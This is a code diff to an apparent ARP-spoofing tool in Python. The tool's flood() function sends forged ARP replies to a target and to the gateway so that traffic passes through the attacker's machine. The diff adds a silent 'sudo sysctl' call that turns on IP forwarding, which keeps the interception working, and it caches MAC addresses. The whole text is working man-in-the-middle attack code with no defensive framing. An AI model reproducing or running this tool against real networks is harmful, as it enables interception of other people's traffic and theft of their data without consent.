@@ -1,3 +1,4 @@
+import os
 from functools import cache
 from time import sleep
 
@@ -19,6 +20,7 @@ def __get_mac(target: str) -> str:
     Returns:
         - mac_addr - The MAC address itself
     """
+    os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
     while True:
         try:
             arp_request = ARP(pdst=target)
@@ -33,6 +35,8 @@ def __get_mac(target: str) -> str:
 
 
 GATEWAY_IP = __get_local_host_ips()[0]
+GATEWAY_MAC = __get_mac(GATEWAY_IP)
+HOST_MAC = __get_host_mac()
 
 
 def flood(target: str) -> None:
@@ -47,12 +51,12 @@ def flood(target: str) -> None:
     packet = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
     send(packet, verbose=False)
 
-    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=__get_mac(GATEWAY_IP), psrc=target)
+    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target)
     send(packet, verbose=False)
 
     print(
-        f"{F.GREEN}{target}{F.RESET} now thinks that {F.BLUE}{__get_mac(GATEWAY_IP)}{F.RESET}"
-        f" (Gateway's MAC Address) is {F.BLUE}{__get_host_mac()}{F.RESET} (Your Mac Address){F.RESET}\r",
+        f"{F.GREEN}{target}{F.RESET} now thinks that {F.BLUE}{GATEWAY_MAC}{F.RESET}"
+        f" (Gateway's MAC Address) is {F.BLUE}{HOST_MAC}{F.RESET} (Your Mac Address){F.RESET}\r",
         end="",
     )
     sleep(2)
